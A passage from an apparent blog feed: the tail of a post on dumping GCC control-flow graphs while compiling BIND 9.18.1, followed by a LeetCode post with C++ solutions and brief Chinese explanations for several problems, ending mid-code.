&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CC=&lt;span class=&quot;string&quot;&gt;&amp;#x27;gcc -fdump-tree-all&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CXX=&lt;span class=&quot;string&quot;&gt;&amp;#x27;g++ -fdump-tree-all&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;编译完成后，进入&lt;code&gt;./bin/named&lt;/code&gt;发现生成了&lt;code&gt;cfg&lt;/code&gt;文件&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tt@ubuntu:~/Desktop/dnsenv/bind-9.18.1/bin/named$ find *.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;builtin.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;config.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;control.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;controlconf.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dlz_dlopen_driver.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fuzz.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;logconf.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;main.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;os.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;server.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;statschannel.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tkeyconf.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;transportconf.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;tsigconf.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;zoneconf.c.011t.cfg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;对于gcc版本足够高的情况&quot;&gt;&lt;a href=&quot;#对于gcc版本足够高的情况&quot; class=&quot;headerlink&quot; title=&quot;对于gcc版本足够高的情况&quot;&gt;&lt;/a&gt;对于gcc版本足够高的情况&lt;/h3&gt;&lt;p&gt;（我用gcc 11.3.0进行测试），在编译时加入以下参数&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-fdump-tree-all-graph&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;可以直接产生&lt;code&gt;.dot&lt;/code&gt;文件（graph description language）&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-21</title>
    <link href="https://jingtianer.github.io/home/2023/02/13/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9321/"/>
    <id>https://jingtianer.github.io/home/2023/02/13/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9321/</id>
    <published>2023-02-13T03:14:34.000Z</published>
    <updated>2023-02-19T10:24:02.562Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1234-替换子串得到平衡字符串"><a href="#1234-替换子串得到平衡字符串" class="headerlink" title="1234. 替换子串得到平衡字符串"></a><a href="https://leetcode.cn/problems/replace-the-substring-for-balanced-string/">1234. 替换子串得到平衡字符串</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBalance</span><span class="params">(<span class="type">int</span>* count, <span class="type">int</span> avg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count[<span class="string">&#x27;Q&#x27;</span>] &lt;= avg &amp;&amp; count[<span class="string">&#x27;R&#x27;</span>] &lt;= avg &amp;&amp; count[<span class="string">&#x27;E&#x27;</span>] &lt;= avg &amp;&amp; count[<span class="string">&#x27;W&#x27;</span>] &lt;= avg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">balancedString</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : s) &#123;</span><br><span class="line">            count[c]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> len = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> avg = len / <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isBalance</span>(count, avg)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = len;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>; l &lt; len; l++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (r &lt; len &amp;&amp; !<span class="built_in">isBalance</span>(count, avg)) &#123;</span><br><span class="line">                count[s[r]]--;</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">isBalance</span>(count, avg)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">min</span>(res, r - l);</span><br><span class="line">            count[s[l]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1138-字母板上的路径"><a href="#1138-字母板上的路径" class="headerlink" title="1138. 字母板上的路径"></a><a href="https://leetcode.cn/problems/alphabet-board-path/">1138. 字母板上的路径</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">alphabetBoardPath</span><span class="params">(string target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">        string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : target) &#123;</span><br><span class="line">            <span class="type">int</span> next_x = <span class="built_in">getX</span>(c), next_y = <span class="built_in">getY</span>(c);</span><br><span class="line">            <span class="type">char</span> step_x = <span class="string">&#x27;L&#x27;</span>, step_y = <span class="string">&#x27;U&#x27;</span>;</span><br><span class="line">            <span class="type">int</span> diff_x = x - next_x, diff_y = y - next_y;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(next_x &gt; x) &#123;</span><br><span class="line">                step_x = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">                diff_x = -diff_x;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(next_y &gt; y) &#123;</span><br><span class="line">                step_y = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">                diff_y = - diff_y;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(next_y == <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; diff_x; i++) &#123;</span><br><span class="line">                    res += step_x;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; diff_y; i++) &#123;</span><br><span class="line">                    res += step_y;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; diff_y; i++) &#123;</span><br><span class="line">                    res += step_y;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; diff_x; i++) &#123;</span><br><span class="line">                    res += step_x;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            res += <span class="string">&quot;!&quot;</span>;</span><br><span class="line">            x = next_x;</span><br><span class="line">            y = next_y;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (c - <span class="string">&#x27;a&#x27;</span>) % <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getY</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (c - <span class="string">&#x27;a&#x27;</span>) / <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>如果默认先纵向走，再横向走，那么当从外部到z时，需要先横向走再纵向走<br>如果默认先横向走，再纵向走，那么当从z到外部时，需要先纵向走再横向走</p></blockquote><h2 id="2335-装满杯子需要的最短总时长"><a href="#2335-装满杯子需要的最短总时长" class="headerlink" title="2335. 装满杯子需要的最短总时长"></a><a href="https://leetcode.cn/problems/minimum-amount-of-time-to-fill-cups/">2335. 装满杯子需要的最短总时长</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fillCups</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> x,y;</span><br><span class="line">        <span class="type">int</span> minn = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(amount[<span class="number">0</span>] == <span class="number">0</span> || amount[<span class="number">1</span>] == <span class="number">0</span> || amount[<span class="number">2</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(amount[<span class="number">0</span>] == <span class="number">0</span>) minn = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(amount[<span class="number">1</span>] == <span class="number">0</span>) minn = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(amount[<span class="number">2</span>] == <span class="number">0</span>) minn = <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(amount[<span class="number">1</span>] &lt; amount[minn]) &#123;</span><br><span class="line">                minn = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(amount[<span class="number">2</span>] &lt; amount[minn]) &#123;</span><br><span class="line">                minn = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> a,b;</span><br><span class="line">            <span class="keyword">if</span>(amount[(minn+<span class="number">1</span>)%<span class="number">3</span>] &gt; amount[(minn + <span class="number">3</span> - <span class="number">1</span>) % <span class="number">3</span>]) &#123;</span><br><span class="line">                a = (minn+<span class="number">1</span>)%<span class="number">3</span>;</span><br><span class="line">                b = (minn + <span class="number">3</span> - <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                b = (minn+<span class="number">1</span>)%<span class="number">3</span>;</span><br><span class="line">                a = (minn + <span class="number">3</span> - <span class="number">1</span>) % <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res += amount[minn];</span><br><span class="line">            <span class="type">int</span> diff = <span class="built_in">min</span>(amount[a] - amount[b], amount[minn]);</span><br><span class="line">            amount[minn] -=  diff;</span><br><span class="line">            amount[a] -= diff;</span><br><span class="line">            amount[a] -= amount[minn]/<span class="number">2</span>;</span><br><span class="line">            amount[b] -= amount[minn] - amount[minn]/<span class="number">2</span>;</span><br><span class="line">            amount[minn] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res += <span class="built_in">max</span>(amount[(minn + <span class="number">3</span> - <span class="number">1</span>) % <span class="number">3</span>], amount[(minn+<span class="number">1</span>)%<span class="number">3</span>]);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>假设初始状态，三杯水的需求量都大于0。选最少的一种，让他和另外两种水一起接，并且尽量让另外两杯水的需求量相近，处理好最少的一种后，最少的一种就变成了0<br>对于剩下的两中温度，操作数就是最大的那个温度<br>如果初始有一个为0，则将minn初始化为对应下标<br>由于只有3个，可以取余减少重复代码</p></blockquote><h2 id="1797-设计一个验证系统"><a href="#1797-设计一个验证系统" class="headerlink" title="1797. 设计一个验证系统"></a><a href="https://leetcode.cn/problems/design-authentication-manager/">1797. 设计一个验证系统</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AuthenticationManager</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;string, <span class="type">int</span>&gt; live;</span><br><span class="line">    <span class="type">int</span> timeToLive;</span><br><span class="line">    <span class="built_in">AuthenticationManager</span>(<span class="type">int</span> timeToLive) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;timeToLive = timeToLive;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">generate</span><span class="params">(string tokenId, <span class="type">int</span> currentTime)</span> </span>&#123;</span><br><span class="line">        live[tokenId] = currentTime + timeToLive;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">renew</span><span class="params">(string tokenId, <span class="type">int</span> currentTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!live.<span class="built_in">count</span>(tokenId) || live[tokenId] &lt;= currentTime) <span class="keyword">return</span>;</span><br><span class="line">        live[tokenId] = currentTime + timeToLive;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countUnexpiredTokens</span><span class="params">(<span class="type">int</span> currentTime)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ite = live.<span class="built_in">begin</span>(); ite != live.<span class="built_in">end</span>(); ite++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ite-&gt;second &gt; currentTime) count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1250-检查「好数组」"><a href="#1250-检查「好数组」" class="headerlink" title="1250. 检查「好数组」"></a><a href="https://leetcode.cn/problems/check-if-it-is-a-good-array/">1250. 检查「好数组」</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isGoodArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> gcd_ = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            gcd_ = <span class="built_in">gcd</span>(nums[i], gcd_);</span><br><span class="line">            <span class="keyword">if</span>(gcd_ == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a &lt; b) <span class="keyword">return</span> <span class="built_in">gcd</span>(b, a);</span><br><span class="line">        <span class="keyword">if</span>(b == <span class="number">0</span>) <span class="keyword">return</span> a;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">gcd</span>(b, a%b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>根据提示 $ Eq. ax+by&#x3D;1 has solution x, y if gcd(a,b) &#x3D; 1. $<br>只要整个数组的最大公约数为1，则可满足题意</p></blockquote><h2 id="1233-删除子文件夹"><a href="#1233-删除子文件夹" class="headerlink" title="1233. 删除子文件夹"></a><a href="https://leetcode.cn/problems/remove-sub-folders-from-the-filesystem/">1233. 删除子文件夹</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">MTreeNode</span> &#123;</span><br><span class="line">    unordered_map&lt;string, MTreeNode*&gt; childList;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;string&gt; res;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">removeSubfolders</span><span class="params">(vector&lt;string&gt;&amp; folder)</span> </span>&#123;</span><br><span class="line">        MTreeNode * root = <span class="keyword">new</span> <span class="built_in">MTreeNode</span>();</span><br><span class="line">        <span class="keyword">for</span>(string&amp; dir : folder) &#123;</span><br><span class="line">            vector&lt;string&gt; dirs = <span class="built_in">splitPath</span>(dir);</span><br><span class="line">            MTreeNode* move = root;</span><br><span class="line">            <span class="type">int</span> dir_len = dirs.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; dir_len; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!move-&gt;childList.<span class="built_in">count</span>(dirs[i])) &#123;</span><br><span class="line">                    move-&gt;childList[dirs[i]] = <span class="keyword">new</span> <span class="built_in">MTreeNode</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                move = move-&gt;childList[dirs[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(string&amp; dir : folder) &#123;</span><br><span class="line">            vector&lt;string&gt; dirs = <span class="built_in">splitPath</span>(dir);</span><br><span class="line">            MTreeNode* move = root;</span><br><span class="line">            <span class="type">int</span> dir_len = dirs.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; dir_len; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!move-&gt;childList.<span class="built_in">count</span>(dirs[i])) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                move = move-&gt;childList[dirs[i]];</span><br><span class="line">            &#125;</span><br><span class="line">            move-&gt;childList.<span class="built_in">clear</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">dfs</span>(root, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(MTreeNode* root, string path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;childList.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> ite = root-&gt;childList.<span class="built_in">begin</span>(); ite != root-&gt;childList.<span class="built_in">end</span>(); ite++) &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(ite-&gt;second, path+<span class="string">&quot;/&quot;</span>+ite-&gt;first);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">splitPath</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; path;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span>(i &lt; n) &#123;</span><br><span class="line">            string dir;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; n &amp;&amp; s[i] == <span class="string">&#x27;/&#x27;</span>) i++;</span><br><span class="line">            <span class="keyword">if</span>(i &lt; n) &#123;</span><br><span class="line">                <span class="keyword">while</span>(i &lt; n &amp;&amp; s[i] != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    dir.<span class="built_in">push_back</span>(s[i]);</span><br><span class="line">                    